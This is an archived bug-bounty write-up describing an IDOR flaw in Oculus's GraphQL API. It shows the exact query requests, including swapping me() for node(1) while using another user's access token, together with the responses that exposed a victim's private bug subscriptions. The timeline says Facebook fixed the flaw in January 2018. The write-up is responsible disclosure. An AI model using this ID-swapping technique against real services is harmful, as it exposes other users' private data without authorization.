---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-01-15_view-the-bug-subscriptions-for-any-oculus-user.md
original_filename: 2018-01-15_view-the-bug-subscriptions-for-any-oculus-user.md
title: View the bug subscriptions for any Oculus User
category: documents
detected_topics:
- idor
- command-injection
- otp
- graphql
tags:
- imported
- documents
- idor
- command-injection
- otp
- graphql
language: en
raw_sha256: 608abe051981da47442209f811a7037d4f1105d688632ac08734ad711ab00627
text_sha256: 548d08683e97cee65c56624b4658d798342907907111f89b69baf537513d4ad0
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# View the bug subscriptions for any Oculus User

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-01-15_view-the-bug-subscriptions-for-any-oculus-user.md
- Source Type: markdown
- Detected Topics: idor, command-injection, otp, graphql
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `608abe051981da47442209f811a7037d4f1105d688632ac08734ad711ab00627`
- Text SHA256: `548d08683e97cee65c56624b4658d798342907907111f89b69baf537513d4ad0`


## Content

---
title: "View the bug subscriptions for any Oculus User"
page_title: "View the bug subscriptions for any Oculus User - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/view-the-bug-subscriptions-for-any-oculus-user/"
final_url: "https://philippeharewood.com/view-the-bug-subscriptions-for-any-oculus-user/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["IDOR"]
publication_date: "2018-01-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6010
---

Posted on [January 15, 2018](https://philippeharewood.com/view-the-bug-subscriptions-for-any-oculus-user/)

# View the bug subscriptions for any Oculus User

Within https://developer.oculus.com/bugs/, there is the ability to subscribe to Oculus bugs created by users. However it is possible to query the subscribed bugs for any user.  
User: phwd  
ID: 1  
OC Access Token: TOKEN_ONE  
Malicious User: phwdtest  
ID: 2  
OC Access Token: TOKEN_TWO  
`https://graph.oculus.com/graphql?q=me%28%29%7Bsubscribed_external_tasks%7Bnodes%7Bid%2Ctitle%7D%7D%7D&access_token=TOKEN_ONE`  
Bug subscriptions for phwd
  
  
  {
  "1": {
  "subscribed_external_tasks": {
  "nodes": [{
  "id": "33",
  "title": "HARDWARE ERROR"
  }]
  }
  }
  }

  
Check bug subscriptions for phwdtest  
`https://graph.oculus.com/graphql?q=me%28%29%7Bsubscribed_external_tasks%7Bnodes%7Bid%2Ctitle%7D%7D%7D&access_token=TOKEN_TWO`
  
  
  {
  "2": {
  "subscribed_external_tasks": {
  "nodes": []
  }
  }
  }

  
Check bug subscriptions for phwd as phwdtest  
`https://graph.oculus.com/graphql?q=node%281%29%7Bsubscribed_external_tasks%7Bnodes%7Bid%2Ctitle%7D%7D%7D&access_token=TOKEN_TWO`
  
  
  {
  "1": {
  "subscribed_external_tasks": {
  "nodes": [{
  "id": "33",
  "title": "HARDWARE ERROR"
  }]
  }
  }
  }

  
**Impact**  
This could have let an attacker view bugs which an Oculus user has subscribed to, which is intended not to be public.  
**Timeline**

  * Jan 15, 2018 – Report Sent
  * Jan 16, 2018 - Further investigation by Facebook
  * Jan 29, 2018 – Fixed by Facebook
  * Jan 31, 2018 – Bounty Awarded by Facebook
